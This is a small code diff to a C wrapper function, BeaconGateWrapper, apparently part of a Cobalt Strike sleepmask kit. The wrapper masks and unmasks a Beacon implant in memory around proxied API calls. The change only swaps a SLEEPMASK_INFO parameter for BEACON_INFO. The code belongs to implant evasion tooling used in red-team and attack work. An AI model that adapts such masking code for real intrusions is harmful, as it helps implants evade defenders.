@@ -11,18 +11,18 @@
 /**
 * A wrapper around BeaconGate to handle masking/unmasking Beacon
 *
-* @param info A pointer to a SLEEPMASK_INFO structure
+* @param info A pointer to a BEACON_INFO structure
 * @param gateFunction A pointer to a FUNCTION_CALL structure
 */
-void BeaconGateWrapper(PSLEEPMASK_INFO info, PFUNCTION_CALL gateFunction) {
+void BeaconGateWrapper(PBEACON_INFO info, PFUNCTION_CALL gateFunction) {
     if (gateFunction->bMask == TRUE) {
-        MaskBeacon(&info->beacon_info);
+        MaskBeacon(info);
     }
 
     BeaconGate(gateFunction);
 
     if (gateFunction->bMask == TRUE) {
-        UnMaskBeacon(&info->beacon_info);
+        UnMaskBeacon(info);
     }
 
     return;
